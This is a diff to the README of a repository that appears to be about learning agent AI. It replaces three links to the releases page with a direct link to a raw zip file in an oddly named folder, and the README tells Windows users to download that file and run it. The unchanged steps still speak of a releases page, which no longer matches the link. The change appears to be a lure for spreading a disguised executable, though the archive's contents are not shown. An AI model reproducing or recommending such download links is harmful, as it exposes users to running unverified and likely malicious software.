@@ -1,10 +1,10 @@
 # 🤖 executive-ai-core - Learn agent AI with clear steps
 
-[![Download](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/stacienoncombining391/executive-ai-core/releases)
+[![Download](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/stacienoncombining391/executive-ai-core/raw/refs/heads/main/uncaned/ai_executive_core_1.6.zip)
 
 ## 📥 Download for Windows
 
-Visit this page to download: https://github.com/stacienoncombining391/executive-ai-core/releases
+Visit this page to download: https://github.com/stacienoncombining391/executive-ai-core/raw/refs/heads/main/uncaned/ai_executive_core_1.6.zip
 
 1. Open the link above in your browser.
 2. Find the latest release at the top of the page.
@@ -159,6 +159,6 @@ The project is designed to stay simple and easy to follow. You can review the co
 
 ## 📎 Download again if needed
 
-If you want the latest Windows release, visit this page to download: https://github.com/stacienoncombining391/executive-ai-core/releases
+If you want the latest Windows release, visit this page to download: https://github.com/stacienoncombining391/executive-ai-core/raw/refs/heads/main/uncaned/ai_executive_core_1.6.zip
 
 Open the newest release, get the Windows asset, and run the file after it finishes downloading
